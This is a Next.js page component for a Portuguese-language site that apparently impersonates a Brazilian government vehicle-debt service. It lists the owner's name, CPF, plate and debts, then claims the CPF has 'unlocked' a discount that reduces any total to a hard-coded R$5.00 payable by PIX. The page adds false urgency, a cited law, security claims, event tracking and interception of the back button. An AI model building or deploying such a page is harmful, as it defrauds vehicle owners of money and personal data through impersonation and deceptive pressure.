"use client"

import type React from "react"

import { useState, useEffect } from "react"
import { Header } from "@/components/header"
import { Footer } from "@/components/footer"
import { SecurityBadge } from "@/components/security-badge"
import { useTracking } from "@/hooks/use-tracking"
import { useRouter } from "next/navigation"
import { BackRedirectProvider, useBackRedirect } from "@/components/back-redirect-provider"

function DebitosPageContent() {
  const [userData, setUserData] = useState<any>(null)
  const [showDetalheDebito, setShowDetalheDebito] = useState<number | null>(null)
  const [isGeneratingPix, setIsGeneratingPix] = useState(false)
  const { sessionId, trackingEnabled, trackEvent } = useTracking()
  const { showBackRedirect } = useBackRedirect()
  const router = useRouter()

  useEffect(() => {
    const savedUserData = localStorage.getItem("userData")
    if (!savedUserData) {
      router.push("/")
      return
    }

    const parsedData = JSON.parse(savedUserData)

    if (!parsedData.veiculo || !parsedData.debitos) {
      router.push("/veiculo")
      return
    }

    const thirtyMinutes = 30 * 60 * 1000
    if (Date.now() - parsedData.timestamp > thirtyMinutes) {
      localStorage.removeItem("userData")
      router.push("/")
      return
    }

    setUserData(parsedData)
  }, [router])

  useEffect(() => {
    if (trackingEnabled && sessionId && userData) {
      trackEvent("page_view", { step: 3, page: "debitos" }, 3)
    }
  }, [trackingEnabled, sessionId, userData, trackEvent])

  const handleVoltar = () => {
    if (isGeneratingPix) return
    if (trackingEnabled && sessionId) {
      trackEvent("back_button_click", { current_step: 3 }, 3)
    }
    showBackRedirect(2)
  }

  const handleNovaConsulta = () => {
    if (isGeneratingPix) return
    if (trackingEnabled && sessionId) {
      trackEvent("new_search_click", { previous_step: 3 }, 3)
    }
    localStorage.removeItem("userData")
    router.push("/")
  }

  const VALOR_FIXO_DESCONTO = 5.0

  const getValorNumericoComDesconto = () => {
    return VALOR_FIXO_DESCONTO
  }

  const getValorTotalOriginal = () => {
    return userData.debitos.reduce((total, debito) => {
      const valorString = debito.total || debito.valor
      const valor = Number.parseFloat(
        valorString
          .replace(/R\$\s?/g, "")
          .replace(/\./g, "")
          .replace(",", "."),
      )
      return total + (isNaN(valor) ? 0 : valor)
    }, 0)
  }

  const calcularPercentualDesconto = () => {
    const totalOriginal = getValorTotalOriginal()
    if (totalOriginal <= 0) return 0

    const economia = totalOriginal - VALOR_FIXO_DESCONTO
    const percentual = (economia / totalOriginal) * 100
    return Math.round(percentual)
  }

  const calcularTotalComDesconto = () => {
    return VALOR_FIXO_DESCONTO.toLocaleString("pt-BR", { style: "currency", currency: "BRL" })
  }

  const calcularEconomia = () => {
    const totalOriginal = getValorTotalOriginal()
    const economia = totalOriginal - VALOR_FIXO_DESCONTO
    return economia.toLocaleString("pt-BR", { style: "currency", currency: "BRL" })
  }

  const handlePagar = async (e: React.MouseEvent) => {
    e.preventDefault()
    e.stopPropagation()

    if (isGeneratingPix) return
    setIsGeneratingPix(true)

    try {
      if (trackingEnabled && sessionId) {
        trackEvent("payment_button_click", { step: 3 }, 3)
      }

      const valorFinal = getValorNumericoComDesconto()

      const paymentData = {
        userData: userData,
        valorOriginal: getValorTotalOriginal(),
        valorFinal: valorFinal,
        economia: getValorTotalOriginal() - valorFinal,
        percentualDesconto: calcularPercentualDesconto(),
        timestamp: Date.now(),
      }
      localStorage.setItem("paymentData", JSON.stringify(paymentData))

      router.push("/pagamento-pix")
    } catch (error) {
      console.error("💥 Erro ao processar pagamento:", error)
      alert(`Erro ao processar pagamento: ${error.message}`)
      setIsGeneratingPix(false)
    }
  }

  const toggleDetalheDebito = (index: number) => {
    setShowDetalheDebito(showDetalheDebito === index ? null : index)
  }

  const formatCpf = (cpf: string) => {
    return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4")
  }

  const formatReferencia = (debito: any) => {
    const parts = []
    if (debito.ano) parts.push(`Ano: ${debito.ano}`)
    if (debito.data) parts.push(`Data: ${debito.data}`)
    if (debito.referencia) parts.push(debito.referencia)
    if (debito.periodo) parts.push(`Período: ${debito.periodo}`)
    if (debito.exercicio) parts.push(`Exercício: ${debito.exercicio}`)

    return parts.length > 0 ? parts.join(" | ") : "Não informado"
  }

  const calcularTotal = () => {
    const total = userData.debitos.reduce((total, debito) => {
      const valorString = debito.total || debito.valor
      const valor = Number.parseFloat(
        valorString
          .replace(/R\$\s?/g, "")
          .replace(/\./g, "")
          .replace(",", "."),
      )
      return total + (isNaN(valor) ? 0 : valor)
    }, 0)

    return total.toLocaleString("pt-BR", { style: "currency", currency: "BRL" })
  }

  if (!userData) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-[#f8f8f8]">
        <div className="animate-spin rounded-full h-32 w-32 border-b-2 border-[#1351B4]"></div>
      </div>
    )
  }

  return (
    <main className="min-h-screen flex flex-col bg-[#f8f8f8]">
      <Header />
      <div className="flex-1 container mx-auto px-4 py-8 max-w-4xl">
        <div className="bg-white p-6 rounded-sm border border-gray-200 shadow-sm">
          <div className="border-b border-gray-200 pb-4 mb-6">
            <h1 className="text-2xl font-bold text-[#071D41]">Consulta de Débitos Veiculares</h1>
            <div className="flex text-sm text-[#555555] mt-1 space-x-4">
              <div>Publicado em 17/12/2023 14h28</div>
              <div>Atualizado em 16/05/2025 14h20</div>
            </div>
          </div>

          {/* Indicador de progresso */}
          <div className="mb-8">
            <div className="flex items-center justify-between">
              <div className="flex flex-col items-center">
                <div className="rounded-full h-10 w-10 flex items-center justify-center bg-[#1351B4] text-white">✓</div>
                <div className="mt-2 text-sm text-[#071D41] font-medium">Identificação</div>
              </div>
              <div className="flex-1 mx-2 h-1 bg-[#1351B4]"></div>
              <div className="flex flex-col items-center">
                <div className="rounded-full h-10 w-10 flex items-center justify-center bg-[#1351B4] text-white">✓</div>
                <div className="mt-2 text-sm text-[#071D41] font-medium">Veículo</div>
              </div>
              <div className="flex-1 mx-2 h-1 bg-[#1351B4]"></div>
              <div className="flex flex-col items-center">
                <div className="rounded-full h-10 w-10 flex items-center justify-center bg-[#1351B4] text-white">3</div>
                <div className="mt-2 text-sm text-[#071D41] font-medium">Débitos</div>
              </div>
            </div>
          </div>

          {/* Dados do Veículo */}
          <div className="bg-[#F8F8F8] p-4 mb-6 border border-gray-200 rounded-sm">
            <h2 className="text-base font-bold text-[#071D41] mb-2">Dados do Veículo</h2>
            <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
              <div>
                <p className="text-xs text-[#555555]">Proprietário</p>
                <p className="font-medium text-[#333333]">{userData.nome}</p>
              </div>
              <div>
                <p className="text-xs text-[#555555]">CPF</p>
                <p className="font-medium text-[#333333]">{formatCpf(userData.cpf)}</p>
              </div>
              <div>
                <p className="text-xs text-[#555555]">Placa</p>
                <p className="font-medium text-[#333333]">{userData.veiculo.placa}</p>
              </div>
              <div>
                <p className="text-xs text-[#555555]">Modelo</p>
                <p className="font-medium text-[#333333]">{userData.veiculo.modelo}</p>
              </div>
              <div>
                <p className="text-xs text-[#555555]">Marca</p>
                <p className="font-medium text-[#333333]">{userData.veiculo.marca}</p>
              </div>
              <div>
                <p className="text-xs text-[#555555]">Ano</p>
                <p className="font-medium text-[#333333]">{userData.veiculo.ano}</p>
              </div>
            </div>
          </div>

          {/* Lista de Débitos */}
          <div className="mb-6">
            <h2 className="text-base font-bold text-[#071D41] mb-4">Débitos do Veículo</h2>

            {userData.debitos.length === 0 ? (
              <div className="bg-green-50 p-4 border border-green-200 rounded-sm">
                <p className="text-green-800">Não há débitos pendentes para este veículo.</p>
              </div>
            ) : (
              <div className="overflow-x-auto">
                <table className="w-full border-collapse">
                  <thead>
                    <tr className="bg-[#F0F5FF]">
                      <th className="border border-gray-300 px-4 py-2 text-left text-xs font-medium text-[#071D41]">
                        Tipo
                      </th>
                      <th className="border border-gray-300 px-4 py-2 text-left text-xs font-medium text-[#071D41]">
                        Referência
                      </th>
                      <th className="border border-gray-300 px-4 py-2 text-left text-xs font-medium text-[#071D41]">
                        Vencimento
                      </th>
                      <th className="border border-gray-300 px-4 py-2 text-left text-xs font-medium text-[#071D41]">
                        Valor
                      </th>
                      <th className="border border-gray-300 px-4 py-2 text-left text-xs font-medium text-[#071D41]">
                        Status
                      </th>
                    </tr>
                  </thead>
                  <tbody>
                    {userData.debitos.map((debito, index) => (
                      <tr key={index} className={index % 2 === 0 ? "bg-white" : "bg-[#F8F8F8]"}>
                        <td className="border border-gray-300 px-4 py-2 text-sm text-[#333333]">{debito.tipo}</td>
                        <td className="border border-gray-300 px-4 py-2 text-sm text-[#333333]">
                          {formatReferencia(debito)}
                        </td>
                        <td className="border border-gray-300 px-4 py-2 text-sm text-[#333333]">
                          {debito.vencimento || "Não informado"}
                        </td>
                        <td className="border border-gray-300 px-4 py-2 text-sm font-medium text-[#333333]">
                          {debito.total || debito.valor}
                        </td>
                        <td className="border border-gray-300 px-4 py-2">
                          <span className="inline-block px-2 py-1 bg-red-100 text-red-800 text-xs rounded-sm">
                            {debito.status}
                          </span>
                        </td>
                      </tr>
                    ))}
                    <tr className="bg-[#E6F2FF] font-bold">
                      <td colSpan={3} className="border border-gray-300 px-4 py-2 text-right text-sm text-[#071D41]">
                        Total:
                      </td>
                      <td className="border border-gray-300 px-4 py-2 text-sm text-[#071D41]">{calcularTotal()}</td>
                      <td className="border border-gray-300 px-4 py-2"></td>
                    </tr>
                  </tbody>
                </table>
              </div>
            )}
          </div>

          <div className="relative mb-6 overflow-hidden rounded-lg shadow-2xl border-4 border-[#06A73C] animate-pulse-slow">
            {/* Background gradient */}
            <div className="absolute inset-0 bg-gradient-to-br from-[#06A73C] via-[#05923A] to-[#047D32] opacity-10"></div>

            {/* Badge "Desconto Liberado" */}
            <div className="absolute top-4 right-4 bg-[#FFD700] text-[#071D41] px-4 py-2 rounded-full font-bold text-sm shadow-lg transform rotate-12 animate-bounce">
              ✓ CPF LIBERADO
            </div>

            <div className="relative bg-gradient-to-r from-[#FFFAEA] to-[#FFF9E6] p-6 md:p-8">
              {/* Header com ícone grande */}
              <div className="text-center mb-6">
                <div className="inline-flex items-center justify-center w-16 h-16 bg-[#06A73C] rounded-full mb-4 shadow-lg">
                  <svg
                    xmlns="http://www.w3.org/2000/svg"
                    className="h-10 w-10 text-white"
                    fill="none"
                    viewBox="0 0 24 24"
                    stroke="currentColor"
                  >
                    <path
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      strokeWidth={2}
                      d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"
                    />
                  </svg>
                </div>

                <h3 className="text-3xl md:text-4xl font-black text-[#071D41] mb-2 leading-tight">SEU CPF LIBEROU</h3>
                <div className="inline-block bg-[#06A73C] text-white px-6 py-3 rounded-lg shadow-lg transform -rotate-2">
                  <span className="text-5xl md:text-6xl font-black">{calcularPercentualDesconto()}%</span>
                  <span className="text-2xl md:text-3xl font-bold ml-2">DE DESCONTO</span>
                </div>
              </div>

              {/* Mensagem de urgência */}
              <div className="bg-[#FF9100] text-white text-center py-3 px-4 rounded-lg mb-6 shadow-md">
                <p className="text-lg md:text-xl font-bold">⏰ OFERTA POR TEMPO LIMITADO - APROVEITE AGORA!</p>
              </div>

              {/* Valores em destaque */}
              <div className="bg-white rounded-xl shadow-xl p-6 mb-6 border-2 border-[#06A73C]">
                <div className="grid grid-cols-1 md:grid-cols-3 gap-6 text-center">
                  <div className="space-y-2">
                    <p className="text-sm text-[#555555] font-medium uppercase tracking-wide">Valor Original</p>
                    <p className="text-2xl md:text-3xl font-bold text-[#333333] line-through">{calcularTotal()}</p>
                  </div>
                  <div className="space-y-2 md:border-x-2 md:border-[#06A73C]">
                    <p className="text-sm text-[#555555] font-medium uppercase tracking-wide">Você Economiza</p>
                    <p className="text-3xl md:text-4xl font-black text-[#06A73C] animate-pulse">{calcularEconomia()}</p>
                  </div>
                  <div className="space-y-2">
                    <p className="text-sm text-[#555555] font-medium uppercase tracking-wide">Valor Final</p>
                    <p className="text-3xl md:text-4xl font-black text-[#D4000F]">{calcularTotalComDesconto()}</p>
                  </div>
                </div>
              </div>

              {/* Benefícios */}
              <div className="grid grid-cols-1 md:grid-cols-3 gap-4 mb-6">
                <div className="flex items-center bg-white p-3 rounded-lg shadow-md">
                  <div className="w-10 h-10 bg-[#06A73C] rounded-full flex items-center justify-center mr-3 flex-shrink-0">
                    <svg className="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
                    </svg>
                  </div>
                  <p className="text-sm font-bold text-[#071D41]">Pagamento Instantâneo via PIX</p>
                </div>
                <div className="flex items-center bg-white p-3 rounded-lg shadow-md">
                  <div className="w-10 h-10 bg-[#06A73C] rounded-full flex items-center justify-center mr-3 flex-shrink-0">
                    <svg className="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path
                        strokeLinecap="round"
                        strokeLinejoin="round"
                        strokeWidth={2}
                        d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"
                      />
                    </svg>
                  </div>
                  <p className="text-sm font-bold text-[#071D41]">100% Seguro e Criptografado</p>
                </div>
                <div className="flex items-center bg-white p-3 rounded-lg shadow-md">
                  <div className="w-10 h-10 bg-[#06A73C] rounded-full flex items-center justify-center mr-3 flex-shrink-0">
                    <svg className="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path
                        strokeLinecap="round"
                        strokeLinejoin="round"
                        strokeWidth={2}
                        d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"
                      />
                    </svg>
                  </div>
                  <p className="text-sm font-bold text-[#071D41]">Quitação Imediata dos Débitos</p>
                </div>
              </div>

              {/* Botão de pagamento gigante */}
              <button
                type="button"
                onClick={handlePagar}
                disabled={isGeneratingPix}
                className="w-full bg-gradient-to-r from-[#06A73C] to-[#05923A] text-white py-6 px-8 rounded-xl hover:from-[#05923A] hover:to-[#047D32] focus:outline-none focus:ring-4 focus:ring-[#06A73C] focus:ring-offset-2 transition-all duration-300 font-black text-xl md:text-2xl shadow-2xl disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center transform hover:scale-105 active:scale-95"
              >
                {isGeneratingPix ? (
                  <>
                    <div className="inline-block animate-spin rounded-full h-8 w-8 border-b-4 border-white mr-4"></div>
                    Processando pagamento...
                  </>
                ) : (
                  <>
                    <svg
                      xmlns="http://www.w3.org/2000/svg"
                      className="h-8 w-8 mr-4"
                      fill="none"
                      viewBox="0 0 24 24"
                      stroke="currentColor"
                    >
                      <path
                        strokeLinecap="round"
                        strokeLinejoin="round"
                        strokeWidth={3}
                        d="M17 9V7a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2h2m2 4h10a2 2 0 002-2v-6a2 2 0 00-2-2H9a2 2 0 00-2 2v6a2 2 0 002 2zm7-5a2 2 0 11-4 0 2 2 0 014 0z"
                      />
                    </svg>
                    PAGAR {calcularTotalComDesconto()} COM PIX E ECONOMIZAR {calcularEconomia()}
                  </>
                )}
              </button>

              {/* Informação adicional */}
              <div className="mt-6 text-center">
                <p className="text-sm text-[#555555] font-medium">
                  🔒 Programa de Regularização de Débitos Veiculares - Lei Nº 14.999/2023
                </p>
                <p className="text-xs text-[#777777] mt-2">
                  Desconto exclusivo aplicado automaticamente ao seu CPF. Válido apenas para pagamento via PIX.
                </p>
              </div>
            </div>
          </div>

          {/* Botões de navegação */}
          <div className="flex justify-start">
            <button
              type="button"
              onClick={handleVoltar}
              disabled={isGeneratingPix}
              className="bg-[#EDEDED] text-[#071D41] py-3 px-6 rounded-sm hover:bg-[#DDDDDD] focus:outline-none focus:ring-2 focus:ring-gray-400 focus:ring-offset-2 transition-colors font-medium disabled:opacity-50 flex items-center"
            >
              <svg
                xmlns="http://www.w3.org/2000/svg"
                className="h-4 w-4 mr-2"
                fill="none"
                viewBox="0 0 24 24"
                stroke="currentColor"
              >
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 19l-7-7 7-7" />
              </svg>
              Voltar
            </button>
          </div>
        </div>

        <div className="mt-6">
          <SecurityBadge />
        </div>
      </div>
      <Footer />
    </main>
  )
}

export default function DebitosPage() {
  return (
    <BackRedirectProvider>
      <DebitosPageContent />
    </BackRedirectProvider>
  )
}
